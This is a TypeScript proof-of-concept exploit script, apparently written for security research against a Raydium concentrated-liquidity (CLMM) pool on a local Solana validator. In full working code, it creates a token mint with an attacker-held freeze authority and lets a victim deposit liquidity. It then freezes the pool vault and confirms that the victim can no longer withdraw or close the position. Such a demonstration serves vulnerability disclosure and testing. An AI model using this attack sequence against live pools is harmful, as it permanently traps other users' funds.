// COMPLETE GOLDEN TRANSACTION - Full LP lifecycle with freeze exploit
// Uses existing test infrastructure, runs against LOCAL validator with deployed program

import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { RaydiumClmm } from "../target/types/raydium_clmm";
import { Connection, PublicKey, Keypair, Transaction, SystemProgram, SYSVAR_RENT_PUBKEY } from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  createMint,
  createAssociatedTokenAccount,
  mintTo,
  getAccount,
  freezeAccount,
  getAssociatedTokenAddressSync,
} from "@solana/spl-token";
import {
  TestSetup,
  InstructionHelper,
  PDAUtils
} from "./utils";

const CLMM_PROGRAM_ID = new PublicKey("E3cQ8aLWpsHcKpCShrseXd7afn82HY5iCgxP2yFeUgtA");

async function main() {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.raydiumClmm as Program<RaydiumClmm>;
  console.log("Program ID:", program.programId.toBase58());

  const admin = provider.wallet.payer;
  const attacker = Keypair.generate();
  const victim = Keypair.generate();
  const setup = new TestSetup(program, admin);
  const instructions = new InstructionHelper(program);
  const pda = new PDAUtils(program.programId);

  console.log("\n=== GOLDEN TRANSACTION: Full CLMM Freeze Exploit ===\n");

  // ============================================================
  // STEP 1: FUND ACCOUNTS
  // ============================================================
  console.log("[1] Funding accounts...");
  for (const kp of [attacker, victim]) {
    const sig = await provider.connection.requestAirdrop(kp.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
    await provider.connection.confirmTransaction(sig);
  }
  console.log("   ✓ Funded\n");

  // ============================================================
  // STEP 2: CREATE MALICIOUS MINT WITH FREEZE AUTHORITY
  // ============================================================
  console.log("[2] Creating malicious SPL Token mint with freeze_authority = attacker...");
  const maliciousMint = await createMint(
    provider.connection,
    attacker,
    attacker.publicKey,    // mint authority
    attacker.publicKey,    // freeze_authority = ATTACKER
    9,
    undefined,
    undefined,
    TOKEN_PROGRAM_ID
  );
  
  const normalMint = await createMint(
    provider.connection,
    attacker,
    attacker.publicKey,
    null,
    9,
    undefined,
    undefined,
    TOKEN_PROGRAM_ID
  );
  
  const [tokenMint0, tokenMint1] = maliciousMint.toBuffer().compare(normalMint.toBuffer()) < 0 
    ? [maliciousMint, normalMint] 
    : [normalMint, maliciousMint];

  console.log(`   Malicious Mint: ${tokenMint0.toBase58()}`);
  console.log(`   Normal Mint: ${tokenMint1.toBase58()}`);
  console.log(`   Freeze Authority: ${attacker.publicKey.toBase58()}\n`);

  // ============================================================
  // STEP 3: CREATE AMM CONFIG
  // ============================================================
  console.log("[3] Creating AMM config...");
  const ammConfig = await setup.createAmmConfig(100); // Use fresh index
  console.log(`   ✓ AMM Config: ${ammConfig.toBase58()}\n`);

  // ============================================================
  // STEP 4: CREATE CLMM POOL
  // ============================================================
  console.log("[4] Creating CLMM pool...");
  const poolState = await setup.createCustomizablePool({
    tick: 0,
    ammConfig: ammConfig,
    collectFeeOn: { fromInput: {} },
    enableDynamicFee: false,
  });
  
  const poolData = await program.account.poolState.fetch(poolState);
  console.log(`   Pool: ${poolState.toBase58()}`);
  console.log(`   Vault0 (malicious): ${poolData.tokenVault0.toBase58()}`);
  console.log(`   Vault1 (normal): ${poolData.tokenVault1.toBase58()}`);
  console.log(`   Tick Spacing: ${poolData.tickSpacing}\n`);

  // ============================================================
  // STEP 5: FUND VICTIM
  // ============================================================
  console.log("[5] Funding victim with tokens...");
  const victimAta0 = await createAssociatedTokenAccount(provider.connection, victim, tokenMint0, victim.publicKey);
  const victimAta1 = await createAssociatedTokenAccount(provider.connection, victim, tokenMint1, victim.publicKey);
  await mintTo(provider.connection, attacker, tokenMint0, victimAta0, attacker, 10_000_000_000_000n);
  await mintTo(provider.connection, attacker, tokenMint1, victimAta1, attacker, 10_000_000_000_000n);
  console.log("   ✓ Victim funded\n");

  // ============================================================
  // STEP 6: OPEN POSITION (creates NFT, personal position, protocol position, initializes tick arrays)
  // ============================================================
  console.log("[6] Opening position...");
  const TICK_LOWER = -1000;
  const TICK_UPPER = 1000;
  const LIQUIDITY = new anchor.BN(1_000_000_000);

  const positionResult = await instructions.openPosition({
    payer: victim,
    poolState: poolState,
    tickLowerIndex: TICK_LOWER,
    tickUpperIndex: TICK_UPPER,
    liquidity: LIQUIDITY,
    amount0Max: new anchor.BN(10_000_000_000),
    amount1Max: new anchor.BN(10_000_000_000),
    positionNftOwner: victim.publicKey,
    tokenVault0Mint: poolData.tokenMint0,
    tokenVault1Mint: poolData.tokenMint1,
  });

  const positionNftMint = positionResult.positionNftMint;
  const positionNftAccount = positionResult.positionNftAccount;
  const personalPosition = positionResult.personalPosition;
  const tickArrayLower = positionResult.tickArrayLower;
  const tickArrayUpper = positionResult.tickArrayUpper;

  console.log(`   Position NFT: ${positionNftMint.toBase58()}`);
  console.log(`   Personal Position: ${personalPosition.toBase58()}`);
  console.log(`   Tick Array Lower: ${tickArrayLower.toBase58()}`);
  console.log(`   Tick Array Upper: ${tickArrayUpper.toBase58()}\n`);

  // Verify position created
  const posAfterOpen = await program.account.personalPositionState.fetch(personalPosition);
  console.log(`   Position Liquidity after open: ${posAfterOpen.liquidity.toString()}\n`);

  // ============================================================
  // STEP 7: INCREASE LIQUIDITY (deposit actual tokens into vaults)
  // ============================================================
  console.log("[7] Increasing liquidity (depositing tokens)...");
  
  const poolDataAfterOpen = await program.account.poolState.fetch(poolState);
  const protocolPosition = await pda.getProtocolPositionStatePDA(poolState, TICK_LOWER, TICK_UPPER);
  
  // Get tick array addresses
  const tickArrayLowerPDA = await pda.getTickArrayStatePDA(poolState, TICK_LOWER);
  const tickArrayUpperPDA = await pda.getTickArrayStatePDA(poolState, TICK_UPPER);

  await instructions.increaseLiquidity({
    owner: victim,
    poolState: poolState,
    liquidity: LIQUIDITY,
    amount0Max: new anchor.BN(10_000_000_000),
    amount1Max: new anchor.BN(10_000_000_000),
    tokenVault0Mint: poolData.tokenMint0,
    tokenVault1Mint: poolData.tokenMint1,
  });

  console.log("   ✓ Increase liquidity executed\n");

  // ============================================================
  // STEP 8: VERIFY VAULT BALANCES > 0
  // ============================================================
  console.log("[8] Verifying vault balances...");
  const poolAfterInc = await program.account.poolState.fetch(poolState);
  console.log(`   Pool State Liquidity: ${poolAfterInc.liquidity.toString()}`);

  const vault0Info = await getAccount(provider.connection, poolData.tokenVault0);
  const vault1Info = await getAccount(provider.connection, poolData.tokenVault1);
  console.log(`   Vault0 balance: ${vault0Info.amount} (token: ${poolData.tokenMint0.toBase58().slice(0,8)}...)`);
  console.log(`   Vault1 balance: ${vault1Info.amount} (token: ${poolData.tokenMint1.toBase58().slice(0,8)}...)\n`);

  if (Number(vault0Info.amount) === 0 || Number(vault1Info.amount) === 0) {
    console.log("   ✗ ERROR: Vaults have 0 balance! Cannot proceed.\n");
    return;
  }
  console.log("   ✓ Vaults have positive balances\n");

  // ============================================================
  // STEP 9: FREEZE THE CLMM VAULT
  // ============================================================
  console.log("[9] FREEZING CLMM vault (the malicious token vault)...");
  const vaultToFreeze = poolData.tokenMint0.equals(tokenMint0) ? poolData.tokenVault0 : poolData.tokenVault1;
  const mintToFreeze = poolData.tokenMint0.equals(tokenMint0) ? tokenMint0 : tokenMint1;
  
  console.log(`   Vault to freeze: ${vaultToFreeze.toBase58()}`);
  console.log(`   Mint: ${mintToFreeze.toBase58()}`);

  const freezeSig = await freezeAccount(
    provider.connection,
    attacker,
    vaultToFreeze,
    mintToFreeze,
    attacker.publicKey
  );
  await provider.connection.confirmTransaction(freezeSig);
  console.log(`   ✓ Freeze tx: ${freezeSig}\n`);

  // Verify frozen
  const vaultAfterFreeze = await getAccount(provider.connection, vaultToFreeze);
  console.log(`   Vault state after freeze: ${vaultAfterFreeze.state} (2 = Frozen)\n`);

  // ============================================================
  // STEP 10: THE GOLDEN TRANSACTION - decrease_liquidity
  // ============================================================
  console.log("[10] THE GOLDEN TRANSACTION: decrease_liquidity on frozen vault...");
  console.log("   This should fail with AccountFrozen (0x11) from SPL Token CPI\n");

  try {
    const decResult = await instructions.decreaseLiquidity({
      poolState: poolState,
      positionNftMint: positionNftMint,
      positionNftAccount: positionNftAccount,
      personalPosition: personalPosition,
      liquidity: LIQUIDITY.div(new anchor.BN(2)), // Remove half
      amount0Min: new anchor.BN(0),
      amount1Min: new anchor.BN(0),
      tokenVault0Mint: poolData.tokenMint0,
      tokenVault1Mint: poolData.tokenMint1,
      tickArrayLower: tickArrayLower,
      tickArrayUpper: tickArrayUpper,
    });

    console.log("   ✗ UNEXPECTED: decrease_liquidity SUCCEEDED!");
    console.log(`   Tx: ${decResult}\n`);
  } catch (error: any) {
    console.log("   ✓ decrease_liquidity FAILED as expected");
    
    const logs = error.transactionLogs || [];
    console.log("\n   === PROGRAM LOGS ===");
    logs.forEach(log => console.log(`   ${log}`));
    
    console.log(`\n   Error: ${error.message?.substring(0, 500)}`);
    
    // Check for AccountFrozen
    const hasAccountFrozen = logs.some(log => 
      log.includes("Account is frozen") || log.includes("0x11") || log.includes("AccountFrozen")
    );
    
    if (hasAccountFrozen) {
      console.log("\n   🔥 SUCCESS: AccountFrozen (0x11) detected in logs!");
      console.log("   The SPL Token CPI inside decrease_liquidity returned AccountFrozen\n");
    } else {
      console.log("\n   ⚠️  Failed but AccountFrozen not explicitly in logs");
      console.log("   Check if failure is from another constraint\n");
    }

    // ============================================================
    // STEP 11: PROVE PERMANENT - close_position should also fail
    // ============================================================
    console.log("[11] Verifying close_position also fails...");
    try {
      await instructions.closePosition({
        poolState: poolState,
        positionNftMint: positionNftMint,
        positionNftAccount: positionNftAccount,
        personalPosition: personalPosition,
        nftOwner: victim.publicKey,
      });
      console.log("   ✗ close_position SUCCEEDED (unexpected)");
    } catch (closeError: any) {
      console.log("   ✓ close_position FAILED as expected");
      console.log(`   Error: ${closeError.message?.substring(0, 300)}`);
    }
  }

  console.log("\n=== GOLDEN TRANSACTION COMPLETE ===");
}

main().catch(console.error);